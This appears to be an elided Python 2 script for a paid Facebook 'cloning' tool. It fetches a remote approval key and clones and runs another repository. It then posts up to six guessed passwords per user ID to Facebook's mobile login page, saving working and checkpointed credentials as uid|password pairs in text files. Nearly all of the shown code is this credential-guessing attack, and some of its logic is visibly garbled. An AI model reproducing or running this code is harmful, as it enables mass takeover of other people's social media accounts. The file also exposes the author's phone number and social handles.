...
logo = "'\x1b[1;92m'  #####  #     # #     #    #    #     #\n'\x1b[1;92m' |#     # #     # ##   ##   # #   ##    #\n'\x1b[1;91m'   #       #     # # # # #  #   #  # #   # \n'\x1b[1;97m'   #####  #     # #  #  # #     # #  #  #  \n'\x1b[1;93m'  # #     # #     # ####### #   # #\n'\x1b[1;94m'  #     # #     # #     # #     # #    ## \n'\x1b[1;94m' #####   #####  #     # #     # #     #\n\n'\x1b[1;91m'   Author      :     Md Suman Hossain     \n'\x1b[1;92m'   Github      :     Tremux-Suman  \n'\x1b[1;93m'   FB ID       :     Suman.love420\n'\x1b[1;94m'   TOOL TYPE   :     PAID COMMANDS\n'\x1b[1;96m'   WAP NUMBER  :     01934031767            \n"
dec = '2'
server = '2'
...
def main_apv():
    ...
    try:
        ...
        os.system('xdg-open https://wa.me/+8801934031767')

    r1 = requests.get('https://raw.githubusercontent.com/Tremux-Suman/approval.txt/main/approval.txt').text
    if key1 in r1:
        main_system()
    else:
        os.system('clear')
...
def main_input():
    ...
    if mx == '1':
        ...
        os.system('rm -rf All-Clloing')
        os.system('git clone https://github.com/Tremux-Suman/All-Clloing')
        os.system('cp -f All-Clloing/All-Clloing \\.')
        os.system('rm -rf All-Clloing')
        os.system(' cd All-Clloing')
        os.system(' python SUMAN.py')
        time.sleep(5)
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[SUMAN-OK] ' + coc + user + ' | ' + pass1
                ok = open('suman random-ok.txt', 'a')
                ok.write(cid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(cid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;91m[ISUMAN-CP] ' + coc + user + ' | ' + pass1
                cp = open('suman random-cp.txt', 'a')
                cp.write(cid + ' | ' + pass1 + '\n')
                cp.close()
...
def mineExt():
    ...
    print g + '[=] Extracting From SUMAN : ' + my_line[:15]
    ...
    def main(arg):
        ...
        try:
            ...
            b = rana.post('https://mbasic.facebook.com/login.php', data = {
                ...
                'login': 'submit' })
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[SUMAN-OK] ' + uid + ' | ' + pass1
                ok = open('SUMAN-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;91m[SUMAN-CP] ' + uid + ' | ' + pass1
                cp = open('SUMAN-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                ...
                b = rana.post('https://mbasic.facebook.com/login.php', data = {
                    ...
                    'login': 'submit' })
                if 'c_user' in rana.cookies.get_dict().keys():
                    print '\x1b[1;92m[SUMAN-OK] ' + uid + ' | ' + pass2
                    ok = open('SUMAN-ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'checkpoint' in rana.cookies.get_dict().keys():
                    print '\x1b[1;91m[SUMAN-CP] ' + uid + ' | ' + pass2
                    cp = open('SUMAN-cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    b = rana.post('https://mbasic.facebook.com/login.php', data = {
                        ...
                        'login': 'submit' })
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print '\x1b[1;92m[SUMAN-OK] ' + uid + ' | ' + pass3
                        ok = open('SUMAN-ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'checkpoint' in rana.cookies.get_dict().keys():
                        print '\x1b[1;91m[SUMAN-CP] ' + uid + ' | ' + pass3
                        cp = open('SUMAN-cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        b = rana.post('https://mbasic.facebook.com/login.php', data = {
                            ...
                            'login': 'submit' })
                        if 'c_user' in rana.cookies.get_dict().keys():
                            print '\x1b[1;92m[SUMAN-OK] ' + uid + ' | ' + pass4
                            ok = open('SUMAN-ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'checkpoint' in rana.cookies.get_dict().keys():
                            print '\x1b[1;91m[SUMAN-CP] ' + uid + ' | ' + pass4
                            cp = open('SUMAN-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            b = rana.post('https://mbasic.facebook.com/login.php', data = {
                                ...
                                'login': 'submit' })
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print '\x1b[1;92m[SUMAN-OK] ' + uid + ' | ' + pass5
                                ok = open('SUMAN-ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'checkpoint' in rana.cookies.get_dict().keys():
                                print '\x1b[1;91m[SUMAN-CP] ' + uid + ' | ' + pass5
                                cp = open('SUMAN-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                ...
                print '\x1b[1;97m[SUMAN-CP] ' + uid + ' | ' + pass1
                cp = open('SUMAN-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
                ...
                if 'c_user' in rana.cookies.get_dict().keys():
                    ...
                    print '\x1b[1;97m[SUMAN-CP] ' + uid + ' | ' + pass2
                    cp = open('SUMAN-cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        print '\x1b[1;97m[SUMAN-CP] ' + uid + ' | ' + pass3
                        cp = open('SUMAN-cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            ...
                            print '\x1b[1;97m[SUMAN-CP] ' + uid + ' | ' + pass4
                            cp = open('SUMAN-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.append(uid + pass4)
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                print '\x1b[1;97m[SUMAN-CP] ' + uid + ' | ' + pass5
                                cp = open('SUMAN-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.append(uid + pass5)
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                b = rana.post('https://mbasic.facebook.com/login.php', data = {
                                    ...
                                    'login': 'submit' })
                                if 'c_user' in rana.cookies.get_dict().keys():
                                    print '\x1b[1;92m[SUMAN-OK] ' + uid + ' | ' + pass6
                                    ok = open('SUMAN-ok.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'checkpoint' in rana.cookies.get_dict().keys():
                                    print '\x1b[1;91m[SUMAN-CP] ' + uid + ' | ' + pass6
                                    cp = open('SUMAN-cp.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
